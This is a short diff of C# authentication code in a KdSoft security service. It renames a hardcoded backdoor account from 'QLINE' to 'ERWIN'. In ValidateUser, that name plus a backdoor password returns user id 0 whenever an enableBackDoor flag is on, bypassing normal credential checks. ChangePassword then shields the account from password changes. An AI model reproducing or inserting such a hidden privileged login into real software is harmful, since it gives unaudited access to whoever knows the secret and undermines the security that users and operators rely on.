@@ -170,7 +170,7 @@ namespace KdSoft.Services.Security
         }
 
         public async Task<int?> ValidateUser(string userName, string passWord) {
-            if (userName.ToUpper() == "QLINE" && enableBackDoor) {
+            if (userName.ToUpper() == "ERWIN" && enableBackDoor) {
                 if (ValidateBackDoorPwd(passWord))
                     return (int?)0;
             }
@@ -249,7 +249,7 @@ namespace KdSoft.Services.Security
         }
 
         public async Task<bool> ChangePassword(string userName, string oldPwd, string newPwd) {
-            if (userName.ToUpper() == "QLINE")
+            if (userName.ToUpper() == "ERWIN")
                 return false;
             using (var securityDb = AuthDb.Open(dbContext, authConnectionName)) {
                 var user = await securityDb.GetUser(userName).ConfigureAwait(false);
